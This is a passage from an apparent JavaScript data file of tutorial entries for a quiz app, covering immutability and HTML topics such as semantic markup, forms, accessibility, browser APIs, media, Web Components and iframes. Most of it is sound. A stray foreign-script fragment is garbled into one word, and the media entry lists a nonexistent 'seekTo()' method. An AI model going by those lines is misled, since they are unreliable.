defensive copies, and reference equality checks become reliable indicators of whether data has changed.\n\nThe practical benefits in frameworks like React are significant: React uses reference equality to determine if components need re-rendering. If state is mutated (same reference), React may miss the change. If state is replaced (new reference), React detects the change and re-renders correctly. This is why the useState setter always replaces the entire state object rather than mutating it. Immutability also enables efficient change detection in libraries like Redux and MobX, time-travel debugging (you can snapshot and restore previous states), and concurrent rendering (multiple versions of state can coexist without conflicts). Common pitfalls include confusion between shallow and deep immutability (spread only copies one level — nested objects are still shared references), performance overhead of creating new objects (mitigated by structural sharing in libraries like Immer), and the temptation to use Object.freeze() for deep immutability (it is shallow and not performant). Libraries like Immer make immutable updates ergonomic by letting you write "mutative" code that produces immutable results',
    example: `// Impure (mutates input)
function addScore(scores, score) {
  scores.push(score);  // side effect!
  return scores;
}

// Pure (returns new array)
function addScore(scores, score) {
  return [...scores, score];
}

// Immutable updates
const user = { name: "Alice", age: 25 };
const updated = { ...user, age: 26 }; // new object

// Array immutability
const items = [1, 2, 3];
const removed = items.filter(i => i !== 2); // [1, 3]
const added = [...items, 4];                // [1, 2, 3, 4]`
  },

  // ═══════════════════════════════════════════
  // HTML
  // ═══════════════════════════════════════════
  {
    title: 'Semantic HTML',
    category: 'HTML',
    subcategory: 'Structure',
    description: 'Using meaningful elements that describe content purpose, not appearance.',
    content: 'Semantic HTML uses elements that convey meaning: header, nav, main, article, section, aside, footer, figure, figcaption, time, mark, details/summary. These improve accessibility (screen readers), SEO (search engines understand structure), and code maintainability. Avoid div-soup — prefer semantic elements whenever possible.\n\nSemantic HTML is the practice of using HTML elements that clearly describe their meaning and purpose, rather than using generic containers like div and span. The benefit is threefold: accessibility, search engine optimization, and developer experience. Screen readers and other assistive technologies rely on semantic elements to convey page structure to users with visual impairments. A screen reader can tell a user "This is a navigation landmark" or "This is the main content" only if you use nav and main elements. Search engines use semantic elements to understand content hierarchy and importance, which directly affects search rankings. And developers benefit from code that is self-documenting — seeing an article element immediately communicates that the content is a self-contained piece of content.\n\nThe key semantic elements and their purposes: header (introductory content or navigation), nav (navigation links), main (the dominant content of the body — there should be only one), article (self-contained content that could be independently distributed), section (thematic grouping of content, typically with a heading), aside (content tangentially related to the content around it), footer (footer for its nearest sectioning content or root element), figure (self-contained content like images, diagrams, code listings), figcaption (caption for a figure element), time (represents a specific period or moment), and mark (highlighted text for reference). Each of these elements has a specific semantic meaning that helps both machines and humans understand the content structure.\n\nCommon mistakes include using div and span for everything (div-soup), using semantic elements purely for styling (use CSS classes instead), misusing elements (putting a nav element around non-navigation content), and skipping heading levels (h1 to h3 without h2). The HTML5 Outliner tool can help you verify your document structure. Another best practice is to use ARIA landmarks and labels only when native HTML semantics are insufficient — native elements are always preferred over ARIA roles. For example, use button instead of div with role="button" and tabindex. Semantic HTML is the foundation of accessible web development and should be considered non-negotiable for production applications',
    example: `<!-- Non-semantic (div soup) -->
<div class="header">
  <div class="nav">...</div>
</div>
<div class="content">...</div>

<!-- Semantic -->
<header>
  <nav aria-label="Main navigation">...</nav>
</header>
<main>
  <article>
    <h1>Title</h1>
    <section aria-labelledby="section1">
      <h2 id="section1">Section</h2>
    </section>
    <aside>Related info</aside>
  </article>
</main>
<footer>
  <time datetime="2025-01-15">Jan 15</time>
</footer>`
  },
  {
    title: 'Forms & Validation',
    category: 'HTML',
    subcategory: 'Forms',
    description: 'Building accessible, validated forms with HTML5 input types and attributes.',
    content: 'HTML5 provides built-in form validation: required, pattern, min/max, minlength/maxlength, type (email, url, tel, number, date). The constraint validation API (checkValidity, reportValidity) and :invalid/:valid pseudo-classes enable custom styling. Always pair HTML validation with server-side validation.\n\nHTML5 forms introduced powerful built-in validation that eliminates the need for much of the custom JavaScript validation that was previously required. The required attribute makes a field mandatory — the browser prevents form submission if the field is empty. The type attribute provides type-specific validation: email checks for valid email format, url checks for valid URL format, tel provides telephone-specific input (with no format validation by default), number restricts to numeric input, and date provides a date picker with format validation. The pattern attribute accepts a regular expression that the input value must match, with a title attribute providing the validation message. minlength and maxlength set string length constraints, while min and max set numeric or date range constraints.\n\nThe constraint validation API provides programmatic access to validation state. checkValidity() returns true if the form/element passes all validation constraints. reportValidity() triggers the browser\'s native validation UI (showing error tooltips). The validity object on each element provides detailed information: validity.valueMissing, validity.typeMismatch, validity.patternMismatch, validity.tooShort, validity.tooLong, validity.rangeUnderflow, validity.rangeOverflow. Custom validation can be implemented by setting the setCustomValidity() method — this overrides the default message and can be used to implement complex cross-field validation logic. The :valid and :invalid pseudo-classes enable CSS styling based on validation state, which is essential for providing visual feedback to users.\n\nBest practices for forms include: always implementing server-side validation (client-side validation is bypassable and should never be the sole line of defense), providing clear and specific error messages (not just "invalid input" but "Please enter a valid email address"), using labels for every input (essential for accessibility — screen readers need labels to announce field purposes), grouping related fields with fieldset and legend, and using novalidate on the form element to disable browser default validation when implementing custom validation UI. The pattern attribute should use common patterns for known formats (email, phone, postal code) rather than overly complex regexes that frustrate users. Progressive enhancement is key: HTML validation works even if JavaScript fails, providing a baseline of functionality. Modern form libraries (React Hook Form, Formik) build on these native features while adding state management and complex validation logic',
    example: `<form novalidate>
  <input type="email" required placeholder="Email"
    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}$" />

  <input type="password" minlength="8"
    pattern="(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
    title="Must contain uppercase, lowercase, and number" />

  <input type="url" required placeholder="Website" />
  <input type="number" min="0" max="100" step="5" />

  <input type="text" required aria-describedby="name-help" />
  <small id="name-help">Your full name</small>

  <button type="submit">Submit</button>
</form>

<script>
document.querySelector('form').addEventListener('submit', (e) => {
  if (!e.target.checkValidity()) {
    e.preventDefault();
    // Show custom error messages
  }
});
</script>`
  },
  {
    title: 'Accessibility (a11y)',
    category: 'HTML',
    subcategory: 'Best Practices',
    description: 'Making web content usable for everyone, including people with disabilities.',
    content: 'Accessibility ensures your site works for screen readers, keyboard navigation, and assistive technologies. Key principles: use semantic HTML, provide alt text for images, ensure keyboard navigation, use ARIA attributes when needed, maintain proper heading hierarchy, ensure sufficient color contrast, and test with actual assistive technology.\n\nWeb accessibility (often abbreviated as a11y, where 11 represents the 11 letters between a and y) ensures that websites and applications are usable by everyone, including people with disabilities. This includes visual impairments (blindness, low vision, color blindness), motor impairments (difficulty using a mouse, reliance on keyboard or voice control), auditory impairments (deafness or hard of hearing), and cognitive impairments (difficulty processing complex information). Accessibility is not just a legal requirement in many jurisdictions (ADA, Section 508, EAA) — it is a fundamental aspect of good web development that benefits all users through improved usability, better SEO, and cleaner code.\n\nThe four principles of accessibility (POUR) are: Perceivable (information must be presentable in ways users can perceive), Operable (interface components must be operable by all users), Understandable (information and UI operation must be understandable), and Robust (content must be interpretable by a wide variety of user agents). Practical implementation starts with semantic HTML — using the right elements for the right purpose provides built-in accessibility for free. Proper heading hierarchy (h1 through h6 in order) enables screen reader users to navigate page structure. Alt text on images describes image content for screen reader users. Keyboard navigation means all interactive elements are focusable and operable without a mouse.\n\nARIA (Accessible Rich Internet Applications) attributes supplement HTML semantics when native elements are insufficient. Use ARIA sparingly — native HTML is always preferred. Key ARIA attributes include aria-label (provides a text label when visible text is not available), aria-labelledby (references another element as the label), aria-describedby (references additional description), aria-hidden (hides content from assistive technology), and role (defines the purpose of an element). Common mistakes include using aria-label when a visible label would be better, setting aria-hidden="true" on focusable elements, using role="button" on non-interactive elements, and not testing with actual assistive technology. Testing tools include axe-core (automated testing), WAVE (visual overlay), NVDA/JAWS (screen readers), and keyboard-only navigation. Automated tools catch only about 30-40% of accessibility issues — manual testing is essential',
    example: `<!-- Alt text for images -->
<img src="chart.png" alt="Sales increased 40% in Q4" />

<!-- Keyboard accessible -->
<button onclick="submit()" tabindex="0">Submit</button>

<!-- ARIA labels for complex widgets -->
<nav aria-label="Main navigation">
  <ul role="menubar">
    <li role="menuitem"><a href="/">Home</a></li>
  </ul>
</nav>

<!-- Form accessibility -->
<label for="email">Email</label>
<input id="email" type="email" aria-required="true"
  aria-invalid="false" aria-describedby="email-error" />
<span id="email-error" role="alert"></span>

<!-- Skip navigation -->
<a href="#main-content" class="skip-link">Skip to content</a>`
  },
  {
    title: 'HTML5 APIs',
    category: 'HTML',
    subcategory: 'APIs',
    description: 'Built-in browser APIs: Canvas, Geolocation, Storage, Workers, and more.',
    content: 'HTML5 introduced powerful APIs: Canvas (2D/3D drawing), Geolocation (user location), Web Storage (localStorage/sessionStorage), Web Workers (background threads), Service Workers (offline support), Drag and Drop, History API (SPA routing), Intersection Observer (lazy loading), and Web Animations API.\n\nHTML5 brought a wave of new browser APIs that transformed the web from a document-viewing platform into a full application platform. The Canvas API provides a bitmap drawing surface for 2D and 3D graphics — it is the foundation of browser-based games, data visualization, image editing, and generative art. The 2D context (getContext("2d")) provides methods for drawing shapes, text, images, and applying transformations. WebGL (getContext("webgl")) extends this to 3D hardware-accelerated graphics. Canvas is imperative — you issue drawing commands — making it suitable for pixel-level manipulation but requiring manual rendering loops for animations.\n\nWeb Storage provides key-value storage in the browser: localStorage persists data indefinitely (until explicitly cleared), while sessionStorage persists only for the current browser session. Both store strings (objects must be serialized with JSON.stringify). They have a 5-10MB limit (varies by browser) and are synchronous (blocking). For structured data, IndexedDB provides a more powerful client-side database with support for large datasets, indexes, and transactions. Web Workers run JavaScript in background threads, preventing CPU-intensive tasks from blocking the UI. They communicate with the main thread via postMessage/onmessage. Service Workers enable offline support, push notifications, and background sync by intercepting network requests. They are the foundation of Progressive Web Apps (PWAs).\n\nOther important HTML5 APIs: Geolocation获取s the user\'s location (requires permission), History API enables SPA-style routing without page reloads (pushState/replaceState), Intersection Observer efficiently detects when elements enter/exit the viewport (essential for lazy loading and infinite scroll), Drag and Drop provides native drag-and-drop support with DataTransfer API, and the Web Animations API provides programmatic animation control with a CSS-like syntax. These APIs collectively make the browser a viable platform for complex applications that previously required native installations. Common pitfalls include not checking for API support (use feature detection, not browser detection), not handling permission denials gracefully, not considering privacy implications (especially Geolocation), and not understanding that Service Workers require HTTPS. Always provide fallbacks for older browsers and consider the performance implications of each API',
    example: `// Canvas drawing
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
ctx.fillStyle = '#3b82f6';
ctx.fillRect(10, 10, 100, 100);

// Geolocation
navigator.geolocation.getCurrentPosition(
  (pos) => console.log(pos.coords.latitude, pos.coords.longitude),
  (err) => console.error(err)
);

// Local Storage
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// Web Worker
const worker = new Worker('worker.js');
worker.postMessage({ data: largeArray });
worker.onmessage = (e) => console.log(e.data);`
  },
  {
    title: 'Meta Tags & SEO',
    category: 'HTML',
    subcategory: 'Best Practices',
    description: 'Optimizing HTML for search engines and social media sharing.',
    content: 'Meta tags provide information about the page to browsers and search engines. Essential tags: charset, viewport, description, keywords, robots, Open Graph (Facebook), Twitter Cards, and canonical URLs. Structured data (JSON-LD) helps search engines understand your content.\n\nMeta tags are placed in the head element and provide metadata about the HTML document that is not visible on the page itself. They serve multiple purposes: telling browsers how to render the page, telling search engines how to index the content, and controlling how the page appears when shared on social media. The charset meta tag specifies the character encoding (UTF-8 is universal and should always be specified), the viewport meta tag controls how the page scales on different devices (essential for responsive design), and the description meta tag provides a brief summary that search engines often display in search results.\n\nSocial media meta tags control how your page appears when shared on platforms like Facebook and Twitter. Open Graph tags (og:title, og:description, og:image, og:url, og:type) are used by Facebook, LinkedIn, and many other platforms. Twitter Cards (twitter:card, twitter:title, twitter:description, twitter:image) control Twitter sharing. These tags are critical for social media marketing — a page without social meta tags may appear as a plain text link when shared, while one with proper tags displays a rich preview with image, title, and description. The canonical URL tag (rel="canonical") tells search engines which version of a URL is the authoritative one, preventing duplicate content issues when the same content is accessible at multiple URLs.\n\nStructured data using JSON-LD (JavaScript Object Notation for Linked Data) is a standardized format for marking up content so search engines can understand it better. It is placed in a script tag with type="application/ld+json". Common schemas include Article, Product, Event, LocalBusiness, Recipe, FAQ, and HowTo. Structured data enables rich results in search (star ratings, prices, event dates, recipe details) which significantly improve click-through rates. The robots meta tag controls indexing behavior: index/noindex (whether to index the page), follow/nofollow (whether to follow links), and noarchive (whether to cache the page). Best practices include writing unique descriptions for each page (150-160 characters), using canonical URLs to prevent duplicate content, implementing structured data for relevant content types, and validating meta tags with tools like Google\'s Rich Results Test',
    example: `<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="SmartQuiz - Master JavaScript with interactive quizzes" />
  <meta name="robots" content="index, follow" />
  <link rel="canonical" href="https://smartquiz.com/page" />

  <!-- Open Graph -->
  <meta property="og:title" content="SmartQuiz" />
  <meta property="og:description" content="Master JavaScript" />
  <meta property="og:image" content="https://smartquiz.com/og.png" />
  <meta property="og:type" content="website" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />

  <!-- Structured Data -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebApplication",
    "name": "SmartQuiz"
  }
  </script>
</head>`
  },
  {
    title: 'Audio & Video',
    category: 'HTML',
    subcategory: 'Media',
    description: 'Embedding and controlling multimedia content with native HTML elements.',
    content: 'The audio and video elements provide native media playback without plugins. Support multiple formats for browser compatibility (MP4/WebM for video, MP3/OGG for audio). Use the media API for programmatic control (play, pause, volume, currentTime). Always provide captions and transcripts for accessibility.\n\nThe audio and video elements replaced the need for plugins like Flash for multimedia playback. They provide native, accessible, and performant media playback across all modern browsers. The video element supports multiple source elements with different formats — browsers will use the first format they support. For video, MP4 (H.264 codec) has near-universal support, while WebM (VP8/VP9) offers better compression. For audio, MP3 is universally supported, while OGG offers an open alternative. Always provide multiple formats to maximize browser compatibility.\n\nThe media API provides programmatic control over playback. Key properties: paused (boolean), duration (total time in seconds), currentTime (current playback position), volume (0 to 1), playbackRate (1 is normal speed), muted (boolean), and ended (boolean). Key methods: play(), pause(), load(), canPlayType(), and seekTo(). Events include play, pause, timeupdate, ended, loadeddata, and error. This API enables custom player controls, progress tracking, and adaptive playback behavior. The track element adds subtitles, captions, and descriptions to video — essential for accessibility and compliance with WCAG guidelines.\n\nBest practices for media include: always providing captions (not just subtitles — captions include non-speech sounds), offering transcripts for audio content, using the poster attribute on video for a preview image, implementing preload="metadata" to avoid loading the entire media file upfront, using the playsinline attribute on mobile to prevent fullscreen playback, and considering adaptive bitrate streaming (HLS or DASH) for large video files. Performance considerations include lazy loading (loading="lazy"), responsive video with CSS (max-width: 100%), and using the loading attribute to defer non-critical media. The Web Animations API and requestAnimationFrame can be used to create synchronized animations with media playback. Common accessibility requirements include providing keyboard controls, ensuring sufficient color contrast for controls, and providing audio descriptions for visual content in video',
    example: `<!-- Video -->
<video controls width="640" poster="thumb.jpg">
  <source src="lesson.mp4" type="video/mp4" />
  <source src="lesson.webm" type="video/webm" />
  <track kind="captions" src="captions.vtt" srclang="en" label="English" />
  Your browser does not support video.
</video>

<!-- Audio -->
<audio controls>
  <source src="podcast.mp3" type="audio/mpeg" />
  <source src="podcast.ogg" type="audio/ogg" />
</audio>

<!-- Programmatic control -->
<script>
  const video = document.querySelector('video');
  video.playbackRate = 1.5;
  video.currentTime = 30;
</script>`
  },
  {
    title: 'Canvas & SVG',
    category: 'HTML',
    subcategory: 'Graphics',
    description: 'Drawing graphics: Canvas for pixel-level control, SVG for scalable shapes.',
    content: 'Canvas provides a bitmap drawing surface — great for pixel manipulation, games, and animations. SVG creates resolution-independent vector graphics — ideal for icons, charts, and UI elements. Canvas is imperative (draw commands), SVG is declarative (DOM elements).\n\nCanvas and SVG are two fundamentally different approaches to rendering graphics in the browser. Canvas provides an immediate-mode bitmap drawing surface — you issue drawing commands that paint pixels directly onto the canvas. There is no DOM representation of drawn shapes; once you draw a rectangle, it becomes pixels and cannot be individually manipulated. This makes Canvas ideal for pixel-level operations, image manipulation, game rendering, and any scenario where you need to render thousands of objects efficiently. SVG (Scalable Vector Graphics) creates DOM elements for each shape — circles, rects, paths, and text are all separate elements that can be styled, event-handled, and manipulated individually. This makes SVG ideal for interactive graphics, data visualizations, icons, and any scenario where shapes need to be individually styled or animated.\n\nCanvas is best for: games and real-time graphics (high performance, hardware acceleration), image processing and filters (pixel manipulation via getImageData/putImageData), data visualization with many data points (thousands of bars, points, or lines), generative art and animations (procedural content creation), and custom rendering engines. SVG is best for: icons and logos (resolution-independent, crisp at any size), interactive charts and graphs (individual elements respond to events), maps and geographic visualizations (crisp lines and text), diagrams and flowcharts (precise positioning and labeling), and any graphic that needs to be styled with CSS or animated with CSS transitions/animations.\n\nPerformance characteristics differ significantly. Canvas performance depends on the number of pixels drawn — more pixels means more work. For complex scenes, consider offscreen canvases, requestAnimationFrame for smooth rendering, and layering multiple canvases for partial updates. SVG performance depends on the number of DOM elements — more elements means slower rendering. For complex SVGs, consider simplifying paths, using CSS transforms instead of SVG transforms, and collapsing elements where possible. Common pitfalls include not accounting for device pixel ratio on high-DPI displays (Canvas images appear blurry), not setting explicit dimensions on Canvas (default is 300x150), forgetting that SVG coordinates start at the top-left (y increases downward), and mixing Canvas and SVG inappropriately. The choice between Canvas and SVG is architectural — consider your specific use case, interaction requirements, and performance constraints',
    example: `<!-- Canvas -->
<canvas id="game" width="800" height="600"></canvas>
<script>
  const ctx = document.getElementById('game').getContext('2d');
  ctx.fillStyle = '#3b82f6';
  ctx.beginPath();
  ctx.arc(400, 300, 50, 0, Math.PI * 2);
  ctx.fill();
</script>

<!-- SVG -->
<svg viewBox="0 0 100 100" width="200" height="200">
  <circle cx="50" cy="50" r="40" fill="#3b82f6" />
  <text x="50" y="55" text-anchor="middle" fill="white">JS</text>
</svg>`
  },
  {
    title: 'Web Components',
    category: 'HTML',
    subcategory: 'Advanced',
    description: 'Custom, reusable HTML elements with encapsulated markup, styles, and behavior.',
    content: 'Web Components consist of Custom Elements (define new tags), Shadow DOM (encapsulated styling), HTML Templates (reusable markup slots), and ES Modules. They work in any framework or vanilla JS. Shadow DOM prevents style leaking and DOM conflicts.\n\nWeb Components are a set of browser-native APIs that enable creating reusable, encapsulated custom HTML elements. Unlike framework components (React, Vue, Angular), Web Components work in any environment — vanilla JavaScript, any framework, or no framework at all. They are the web platform\'s answer to the component model problem. The three core technologies are: Custom Elements (define new HTML tags with custom behavior), Shadow DOM (encapsulated DOM and styling), and HTML Templates (reusable markup fragments). Together, these enable creating truly reusable UI components that can be shared across projects and teams regardless of technology choices.\n\nCustom Elements define new HTML tags with the customElements.define() method. You create a class extending HTMLElement, define its behavior in the constructor and connectedCallback (called when inserted into the DOM), and register it with a tag name (must contain a hyphen). Lifecycle callbacks include constructor, connectedCallback (mounted), disconnectedCallback (unmounted), attributeChangedCallback (attribute modified), and adoptedCallback (moved to new document). Shadow DOM provides encapsulation by creating a separate DOM subtree attached to a host element. Styles defined inside Shadow DOM do not leak out, and external styles do not leak in. This prevents CSS conflicts — the most common problem in large applications. Slots allow external content to be projected into specific locations within the Shadow DOM.\n\nWeb Components are used extensively in enterprise applications, design systems, and micro-frontends. Companies like GitHub, YouTube, and ING Bank use Web Components for their design systems because they work across all frameworks. The practical benefits include true style encapsulation (no CSS naming conventions needed), framework independence (components work everywhere), and native browser support (no build step or runtime library required). Limitations include the learning curve, the verbosity of Custom Elements API compared to frameworks, limited SSR (Server-Side Rendering) support, and the need for polyfills in older browsers. Common patterns include using HTML Templates with slots for content projection, using Constructable Stylesheets for shared styles across components, and using the :host pseudo-element to style the host element from within Shadow DOM. Web Components are not a replacement for framework components — they complement them by providing a standards-based foundation for reusable UI primitives',
    example: `class MyCard extends HTMLElement {
  constructor() {
    super();
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = \`
      <style>
        .card { padding: 20px; border-radius: 12px; background: #1a1a2e; }
        ::slotted(h2) { color: white; margin: 0; }
      </style>
      <div class="card">
        <slot name="title"></slot>
        <slot name="content"></slot>
      </div>
    \`;
  }
}
customElements.define('my-card', MyCard);

// Usage
// <my-card>
//   <h2 slot="title">Hello</h2>
//   <p slot="content">World</p>
// </my-card>`
  },
  {
    title: 'Drag & Drop API',
    category: 'HTML',
    subcategory: 'Interaction',
    description: 'Native browser support for dragging elements between locations.',
    content: 'HTML5 Drag & Drop provides draggable attribute and events: dragstart, drag, dragenter, dragover, dragleave, drop, dragend. Use DataTransfer API to pass data between drag source and drop target. Works with files too (file drag from desktop).\n\nThe HTML5 Drag and Drop API enables interactive drag-and-drop functionality directly in the browser without external libraries. Any element can be made draggable by setting the draggable="true" attribute. The API provides a series of events that fire during the drag lifecycle: dragstart (when dragging begins), drag (while dragging), dragenter (when dragged element enters a valid drop target), dragover (while over a valid drop target — must call event.preventDefault() to allow dropping), dragleave (when leaving a drop target), drop (when dropped on a valid target), and dragend (when dragging ends, regardless of drop success). The DataTransfer object carries the data being dragged and provides methods to set and retrieve data in various formats.\n\nThe DataTransfer API is the mechanism for passing data between drag source and drop target. On dragstart, use dataTransfer.setData(format, data) to set the data (e.g., dataTransfer.setData("text/plain", "Hello")). On drop, use dataTransfer.getData(format) to retrieve it. The dataTransfer object also controls the visual feedback: dataTransfer.effectAllowed specifies what operations are allowed (copy, move, link, all), dataTransfer.dropEffect specifies what will happen on drop, and dataTransfer.setDragImage() customizes the drag preview. The API also supports file dragging — files dragged from the desktop can be dropped onto a drop zone and accessed via dataTransfer.files.\n\nCommon use cases include sortable lists, card reordering, file upload zones, kanban boards, and interactive dashboards. The API works well for basic drag-and-drop but has limitations for complex interactions (nested drop zones, animation during drag, custom drag previews). For sophisticated drag-and-drop, consider libraries like dnd-kit, react-beautiful-dnd, or SortableJS which provide better UX, accessibility, and mobile support. Common pitfalls include forgetting to call event.preventDefault() on dragover (which prevents the drop event from firing), not providing visual feedback during drag (users need to know where they can drop), and not handling the case where data transfer fails. Mobile browsers have limited support for the Drag and Drop API — touch events or libraries are needed for mobile drag-and-drop',
    example: `<!-- Draggable element -->
<div draggable="true" ondragstart="handleDrag(event)">
  Drag me
</div>

<!-- Drop zone -->
<div class="dropzone"
  ondragover="event.preventDefault()"
  ondrop="handleDrop(event)">
  Drop here
</div>

<script>
function handleDrag(e) {
  e.dataTransfer.setData('text/plain', 'Hello');
  e.dataTransfer.effectAllowed = 'move';
}

function handleDrop(e) {
  e.preventDefault();
  const data = e.dataTransfer.getData('text/plain');
  e.target.textContent = data;
}
</script>`
  },
  {
    title: 'Details & Summary',
    category: 'HTML',
    subcategory: 'Interactive',
    description: 'Native disclosure widget — accordion/collapsible without JavaScript.',
    content: 'The details element creates a disclosure widget that can be toggled open/closed. The summary element provides the visible heading. It\'s accessible by default (keyboard navigable, screen reader friendly). Use for FAQs, collapsible sections, and progressive disclosure.\n\nThe details and summary elements provide a native, accessible disclosure widget without requiring any JavaScript. The details element is a container that can be toggled between open and closed states. The summary element provides the always-visible heading — clicking it (or pressing Enter/Space when focused) toggles the details content. The open attribute on details controls the initial state (details open displays the content by default). This pattern is known as "progressive disclosure" — showing detailed information only when the user requests it, reducing cognitive load and visual clutter.\n\nThe accessibility features are built-in: the summary element is focusable and responds to keyboard interaction (Enter and Space to toggle), the element announces its state to screen readers ("expanded" or "collapsed"), and the content inside details is properly exposed to assistive technology when open. This native accessibility is a significant advantage over custom accordion implementations, which often require careful ARIA attribute management to achieve the same level of accessibility. The details element can be styled with CSS — the ::marker pseudo-element styles the disclosure triangle, and the [open] attribute selector targets the open state.\n\nCommon use cases include FAQ sections (each question is a summary, answer is the details content), collapsible navigation menus, settings panels with advanced options, terms and conditions that expand on click, and any content that benefits from being hidden by default. Styling the disclosure triangle can be done with the ::marker pseudo-element or by hiding the default marker (list-style: none) and adding a custom indicator with the ::before pseudo-element. Common pitfalls include nesting details elements (which can create confusing UX), not providing clear summary text that indicates what will be revealed, and using details for content that should always be visible (details is for optional content, not essential content). Multiple details elements can be used together to create an accordion pattern, but for exclusive accordion behavior (only one open at a time), JavaScript is needed',
    example: `<!-- Basic usage -->
<details>
  <summary>What is JavaScript?</summary>
  <p>A lightweight, interpreted programming language.</p>
</details>

<!-- Open by default -->
<details open>
  <summary>How to learn?</summary>
  <p>Practice with SmartQuiz!</p>
</details>

<!-- Styled accordion -->
<style>
  details { margin: 8px 0; border: 1px solid #333; border-radius: 8px; }
  summary { padding: 12px; cursor: pointer; color: white; }
  details[open] summary { border-bottom: 1px solid #333; }
  details p { padding: 12px; color: #aaa; margin: 0; }
</style>`
  },
  {
    title: 'Iframes & Embedding',
    category: 'HTML',
    subcategory: 'Embedding',
    description: 'Embedding external content and isolated browsing contexts.',
    content: 'Iframes embed other HTML documents. Use sandbox attribute for security (restrict capabilities). loading="lazy" defers loading. title attribute is required for accessibility. Use for maps, videos, widgets, and third-party content. Consider performance implications.\n\nThe iframe (inline frame) element embeds another HTML document within the current page, creating a nested browsing context. It is the standard way to include external content like YouTube videos, Google Maps, payment forms, and third-party widgets. The src attribute specifies the URL of the embedded document. The width and height attributes control the iframe dimensions. The title attribute is required for accessibility — screen readers use it to announce the iframe\'s purpose. Without a descriptive title, screen reader users have no way to know what the iframe contains.\n\nThe sandbox attribute is a critical security feature that restricts what the embedded content can do. Without any value, it applies all restrictions: blocks forms, blocks JavaScript, blocks popups, blocks top-level navigation, and blocks same-origin access. You can selectively lift restrictions: allow-scripts enables JavaScript, allow-same-origin allows the content to be treated as same-origin, allow-forms enables form submission, allow-popups allows window.open(), and allow-top-navigation allows navigating the parent frame. The allow attribute (Permissions Policy) controls access to browser features like camera, microphone, geolocation, and autoplay. The loading="lazy" attribute defers iframe loading until the iframe enters the viewport, improving initial page load performance.\n\nSecurity considerations are paramount with iframes. Never embed untrusted content without sandbox restrictions — a malicious iframe can redirect the parent page, access cookies, or perform phishing attacks. The X-Frame-Options HTTP header (DENY or SAMEORIGIN) controls whether your page can be embedded in iframes on other sites, protecting against clickjacking attacks. Content Security Policy (CSP) frame-ancestors directive provides more granular control over who can embed your content. Performance implications include: each iframe creates a separate browsing context with its own DOM, CSSOM, and JavaScript runtime, which means additional memory and CPU usage. Iframes block the parent page\'s onload event until the embedded content loads. Use loading="lazy" for non-critical iframes and consider replacing iframes with API-based alternatives when possible (e.g., using YouTube\'s embed API instead of an iframe for more control)',
    example: `<!-- Basic iframe -->
<iframe src="https://example.com"
  width="100%" height="400"
  title="Embedded content"
  loading="lazy"
  sandbox="allow-scripts allow-same-origin">
</iframe>

<!-- Embed YouTube -->
<iframe width="560" height="315"
  src="https://www.youtube.com/embed/dQw4w9WgXcQ"
  title="YouTube video"
  allow="accelerometer; autoplay; clipboard-write"
  allowfullscreen>
</iframe>

<!-- Embed CodePen -->
<iframe height="300" scrolling="no"
  src="https://codepen.io/pen/embed/xxx">
</iframe>`
  },
  {
    title: 'Tables & Data',
    category: 'HTML',
    subcategory: 'Structure',
    description: 'Properly structuring tabular data with accessible table elements.',
    content: 'Tables should be used for tabular data, NOT for layout. Key elements: table, thead, tbody, tfoot, tr, th, td, caption, colgroup. Use scope="col" or scope="row" on th for accessibility. caption provides a title. Thead/tfoot repeat on page breaks.\n\nHTML tables are designed for presenting tabular data — information that is naturally organized in rows and columns. Before CSS layout existed, tables were misused for page layout, which created accessibility and maintenance nightmares. Today, tables should only be used for actual tabular data. The table element is the container, with thead for header rows, tbody for body rows, tfoot for footer rows (often containing summaries), tr for table rows, th for header cells, td for data cells, and caption for the table title. The colgroup and col elements define column-specific styling and structure.\n\nAccessibility is critical for tables. The scope attribute on th elements tells screen readers whether the header applies to a column (scope="col") or a row (scope="row"). This enables screen readers to announce the correct header when navigating through data cells. The caption element provides a title for the table, which screen readers announce before reading the table content. For complex tables with multiple header levels or spanning cells, use headers and id attributes to explicitly associate data cells with their headers. Tables without proper header associations are nearly impossible for screen reader users to navigate — they hear a series of disconnected values without knowing what each value represents.\n\nBest practices include: always using thead, tbody, and tfoot (even if not visually needed — they provide structural semantics), providing a caption for every table, using scope on all th elements, avoiding complex colspan/rowspan when simpler structures work, using CSS for styling (borders, spacing, colors) rather than HTML attributes, and considering responsive design (horizontal scrolling with overflow-x: auto for tables that exceed viewport width). For large datasets, consider virtual scrolling to render only visible rows. The summary attribute (deprecated in HTML5 but still useful for accessibility) provides a longer description of the table\'s purpose and structure. Modern CSS features like position: sticky enable sticky headers and columns, improving usability for large tables. Never use tables for layout — use CSS Grid or Flexbox instead',
    example: `<table>
  <caption>Quiz Results</caption>
  <thead>
    <tr>
      <th scope="col">Question</th>
      <th scope="col">Your Answer</th>
      <th scope="col">Correct</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>What is hoisting?</td>
      <td>Moving declarations</td>
      <td>✓</td>
    </tr>
    <tr>
      <td>What is closure?</td>
      <td>Variable scope</td>
      <td>✗</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td colspan="2">Score</td>
      <td>50%</td>
    </tr>
  </tfoot>
</table>`
  },
  {
    title: 'Progress & Meter',
    category: 'HTML',
    subcategory: 'Interactive',
    description: 'Native elements for displaying completion status and scalar measurements.',
